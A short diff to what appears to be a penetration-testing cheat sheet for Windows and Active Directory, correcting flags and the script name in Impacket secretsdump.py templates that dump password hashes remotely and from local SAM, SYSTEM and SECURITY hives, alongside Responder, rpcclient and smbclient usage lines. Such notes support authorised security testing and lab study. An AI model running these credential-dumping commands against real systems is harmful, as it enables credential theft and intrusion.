@@ -86,10 +86,10 @@ Responder.py -I <interface>
 rpcclient [-U <user>| -N] <target-ip-or-domain>
 
 # secretsdump.py dump hashes remotely
-secretsdump.py '<fqdn">/<username>:<password>@<target-ip-or-hostname>' <dc-ip> -outputfile <out-file>
+secretsdump.py '<fqdn">/<username>:<password>@<target-ip-or-hostname>' -dc-ip <dc-ip> -outputfile <out-file>
 
 # secretsdump.py dump hashes from a local copy of sam system and security hives
-secretsdump -sam <path-to-sam> -system <path-to-system> -security <path-to-security> LOCAL -outputfile <out-file>
+secretsdump.py -sam <path-to-sam> -system <path-to-system> -security <path-to-security> LOCAL -outputfile <out-file>
 
 # smbclient interactive smb connection; -W domain; -U user name
 smbclient \\\\<ip-or-hostname>\\<share-name> [-W <domain-name> -U <user>]
